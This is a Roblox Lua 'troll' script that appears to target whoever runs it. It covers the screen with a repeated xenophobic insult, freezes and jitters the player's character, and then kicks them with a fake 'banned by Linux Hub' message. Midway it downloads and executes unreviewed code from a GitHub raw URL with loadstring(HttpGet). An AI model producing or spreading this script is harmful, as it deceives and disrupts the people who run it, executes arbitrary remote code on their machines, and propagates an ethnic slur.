-- Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local humanoid = char:WaitForChild("Humanoid")
local hrp = char:WaitForChild("HumanoidRootPart")

-- GUI principal (vai em CoreGui pra tampar até o chat)
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "FullBlackScreenTroll"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = CoreGui

-- Fundo preto gigante
local frame = Instance.new("Frame")
frame.Size = UDim2.new(5,0,5,0) -- maior que a tela
frame.Position = UDim2.new(-2,0,-2,0)
frame.BackgroundColor3 = Color3.new(0,0,0)
frame.ZIndex = 10
frame.Parent = screenGui

-- Mensagem central gigante
local mainMsg = Instance.new("TextLabel")
mainMsg.Size = UDim2.new(1,0,1,0)
mainMsg.BackgroundTransparency = 1
mainMsg.Text = "GO SKID FROM YOUR MOM, STUPID FOREIGNER"
mainMsg.TextColor3 = Color3.new(1,0,0)
mainMsg.TextScaled = true
mainMsg.Font = Enum.Font.GothamBlack
mainMsg.ZIndex = 20
mainMsg.Parent = frame

-- Frases espalhadas pela tela
for i = 1, 80 do
    local msg = Instance.new("TextLabel")
    msg.Size = UDim2.new(0, math.random(200,400), 0, math.random(50,120))
    msg.Position = UDim2.new(math.random(), 0, math.random(), 0)
    msg.BackgroundTransparency = 1
    msg.Text = "GO SKID FROM YOUR MOM, STUPID FOREIGNER"
    msg.TextColor3 = Color3.new(1,1,1)
    msg.TextScaled = true
    msg.Font = Enum.Font.GothamBold
    msg.Rotation = math.random(-20,20)
    msg.ZIndex = 15
    msg.Parent = frame
end

-- Travar player
humanoid.WalkSpeed = 0
humanoid.JumpPower = 0

-- Bugar câmera e personagem
local cam = workspace.CurrentCamera
RunService.RenderStepped:Connect(function()
    cam.CFrame = cam.CFrame * CFrame.Angles(
        math.rad(math.random(-2,2)), 
        math.rad(math.random(-2,2)), 
        0
    )
    hrp.CFrame = hrp.CFrame * CFrame.new(
        math.random(-1,1) * 0.25, 
        0, 
        math.random(-1,1) * 0.25
    )
end)

-- Executar jumpscare externo
loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()

-- Kick após 1 minuto
delay(60, function()
    -- Limpar GUI
    screenGui:Destroy()
    
    -- Criar GUI do kick
    local kickGui = Instance.new("ScreenGui")
    kickGui.Name = "KickMessage"
    kickGui.IgnoreGuiInset = true
    kickGui.ResetOnSpawn = false
    kickGui.Parent = CoreGui

    local kickFrame = Instance.new("Frame")
    kickFrame.Size = UDim2.new(1,0,1,0)
    kickFrame.Position = UDim2.new(0,0,0,0)
    kickFrame.BackgroundColor3 = Color3.new(0,0,0)
    kickFrame.Parent = kickGui

    local kickText = Instance.new("TextLabel")
    kickText.Size = UDim2.new(1,0,1,0)
    kickText.BackgroundTransparency = 1
    kickText.Text = "VC FOI BANIDO PELO LINUX HUB\nYOU HAVE BEEN BANNED BY LINUX HUB"
    kickText.TextColor3 = Color3.new(1,0,0)
    kickText.TextScaled = true
    kickText.Font = Enum.Font.GothamBlack
    kickText.Parent = kickFrame

    -- Dar kick
    player:Kick("VC FOI BANIDO PELO LINUX HUB | YOU HAVE BEEN BANNED BY LINUX HUB")
end)
